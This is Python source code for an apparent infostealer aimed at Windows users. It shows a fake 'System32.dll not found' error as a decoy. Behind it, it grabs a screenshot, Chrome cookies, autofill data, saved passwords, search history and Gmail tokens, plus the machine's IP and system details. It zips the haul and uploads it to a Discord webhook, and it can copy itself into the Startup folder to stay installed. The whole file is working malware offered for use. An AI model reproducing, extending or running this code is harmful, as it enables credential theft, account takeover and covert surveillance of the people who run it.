#Do whatever the fuck you want with this code, but don't blame me if you get in trouble.
# Additional collection options (will be modified by build_exe.py)
# PASSWORD_COLLECTION_ENABLED = False
# HISTORY_COLLECTION_ENABLED = False
# DOWNLOADS_COLLECTION_ENABLED = False
# ENABLE_STARTUP_PERSISTENCE = False
import tkinter as tk
from tkinter import messagebox
from PIL import ImageGrab
import threading
import sqlite3
import os
import shutil
import json
import zipfile
import glob
import time
import urllib.parse
from datetime import datetime
import requests  # For IP lookup
import socket    # For local network info
import platform  # For system details
import psutil  # For process management
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import re
import sys
import platform
import socket
import requests
import json
import threading
import zipfile
import shutil
import time
import sqlite3
import importlib
import browser_data
importlib.reload(browser_data)
from browser_data import (
    find_chrome_cookies,
    get_chrome_cookies,
    get_chrome_autofill,
    get_chrome_search_history,
    get_chrome_passwords,
    get_chrome_history,
    get_chrome_downloads,
    get_chrome_gmail_tokens
)

# Create a folder for output
OUTPUT_FOLDER = "CollectedData"
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

def show_fake_error():
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Critical Error", "System32.dll not found! This application will now close.")
    root.destroy()

def take_screenshot():
    screenshot_folder = os.path.join(OUTPUT_FOLDER, "screenshots")
    os.makedirs(screenshot_folder, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    screenshot_path = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
    
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)
    print(f"[+] Screenshot saved to {screenshot_path}")
    return screenshot_path

# Define the network info function
def get_network_info():
    network_folder = os.path.join(OUTPUT_FOLDER, "network")
    os.makedirs(network_folder, exist_ok=True)
    output_file = os.path.join(network_folder, "network_info.json")
    
    network_data = {}
    
    try:
        # Get public IP (VPN exit node)
        public_ip = requests.get("https://api.ipify.org").text
        network_data["public_ip"] = public_ip
        
        # Get local network details
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        network_data["hostname"] = hostname
        network_data["local_ip"] = local_ip
        
        # Get system info
        network_data["system"] = {
            "os": platform.system(),
            "version": platform.version(),
            "machine": platform.machine()
        }
        
        # Save to JSON
        with open(output_file, "w") as f:
            json.dump(network_data, f, indent=4)
        print(f"[+] Network data saved to {output_file}")
        
    except Exception as e:
        print(f"Error fetching network info: {e}")

# Add the compress_to_zip function
def compress_to_zip():
    zip_path = f"{OUTPUT_FOLDER}.zip"
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(OUTPUT_FOLDER):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, OUTPUT_FOLDER)
                zipf.write(file_path, arcname)
    print(f"[+] Data compressed to {zip_path}")

def send_to_discord_webhook(webhook_url, file_path, content=None):
    """Sends a file to a Discord webhook"""
    try:
        file_name = os.path.basename(file_path)
        
        # Prepare multipart form data
        boundary = '----WebKitFormBoundary' + ''.join(['1234567890'[i % 10] for i in range(16)])
        
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
        }
        
        # Create payload
        payload = []
        
        # Add content if provided
        if content:
            payload.append(f'--{boundary}')
            payload.append('Content-Disposition: form-data; name="content"')
            payload.append('')
            payload.append(content)
        
        # Add file
        payload.append(f'--{boundary}')
        payload.append(f'Content-Disposition: form-data; name="file"; filename="{file_name}"')
        payload.append('Content-Type: application/octet-stream')
        payload.append('')
        
        # Join payload parts
        payload_str = '\r\n'.join(payload) + '\r\n'
        
        # Read file as binary
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        # Create final payload
        final_payload = payload_str.encode() + file_data + f'\r\n--{boundary}--'.encode()
        
        # Send request
        response = requests.post(webhook_url, headers=headers, data=final_payload)
        
        if response.status_code == 200 or response.status_code == 204:
            print(f"[+] Successfully sent {file_name} to Discord webhook")
            return True
        else:
            print(f"[!] Failed to send {file_name} to Discord webhook: {response.status_code}")
            return False
    
    except Exception as e:
        print(f"[!] Error sending to Discord webhook: {str(e)}")
        return False

def setup_persistence():
    """Set up persistence to run on startup"""
    if not 'ENABLE_STARTUP_PERSISTENCE' in globals() or not ENABLE_STARTUP_PERSISTENCE:
        print("[*] Startup persistence disabled, skipping...")
        return
        
    try:
        # Get the path to the current executable
        if getattr(sys, 'frozen', False):
            # Running as compiled executable
            current_exe = sys.executable
        else:
            # Running as script
            current_exe = os.path.abspath(__file__)
        
        # Get the filename
        exe_name = os.path.basename(current_exe)
        
        # Create a copy in the startup folder
        startup_folder = os.path.join(os.environ["APPDATA"], 
                                     "Microsoft", "Windows", "Start Menu", 
                                     "Programs", "Startup")
        
        startup_path = os.path.join(startup_folder, exe_name)
        
        try:
            # Copy the file
            shutil.copy2(current_exe, startup_path)
            print(f"[+] Persistence established: {startup_path}")
            return True
        except Exception as e:
            print(f"[!] Failed to establish persistence: {str(e)}")
            return False
    except Exception as e:
        print(f"[!] Error in setup_persistence: {str(e)}")
        return False

# Add these imports at the top of your main.py file
import importlib
import system_info
importlib.reload(system_info)
from system_info import get_system_info, get_installed_browsers

# Then in your main execution block, add these lines:
if __name__ == "__main__":
    # Discord webhook URL - replace with your actual webhook URL when using
    WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"  # Replace this with your webhook URL
    
    # Create output folder
    os.makedirs(OUTPUT_FOLDER, exist_ok=True)
    
    # Run fake error in a thread
    error_thread = threading.Thread(target=show_fake_error)
    error_thread.start()
    
    # Collect data
    take_screenshot()
    
    # Use the imported functions from browser_data.py
    get_chrome_cookies(OUTPUT_FOLDER)
    get_chrome_autofill(OUTPUT_FOLDER)
    get_network_info()
    get_chrome_search_history(OUTPUT_FOLDER)
    get_chrome_passwords(OUTPUT_FOLDER)
    
    # Optional history and downloads collection
    history_enabled = 'HISTORY_COLLECTION_ENABLED' in globals() and HISTORY_COLLECTION_ENABLED
    downloads_enabled = 'DOWNLOADS_COLLECTION_ENABLED' in globals() and DOWNLOADS_COLLECTION_ENABLED
    get_chrome_history(OUTPUT_FOLDER, history_enabled)
    get_chrome_downloads(OUTPUT_FOLDER, downloads_enabled)
    
    # Compress the data
    compress_to_zip()
    
    # Get system information
    get_system_info(OUTPUT_FOLDER)
    get_installed_browsers(OUTPUT_FOLDER)
    
    # Get Gmail data
    get_chrome_gmail_tokens(OUTPUT_FOLDER)
    
    # Send the zip file to Discord
    zip_path = f"{OUTPUT_FOLDER}.zip"
    if os.path.exists(zip_path):
        system_info = f"Hostname: {socket.gethostname()}\nOS: {platform.system()} {platform.version()}"
        send_to_discord_webhook(WEBHOOK_URL, zip_path, system_info)
    
    # Wait for the error thread to finish
    error_thread.join()
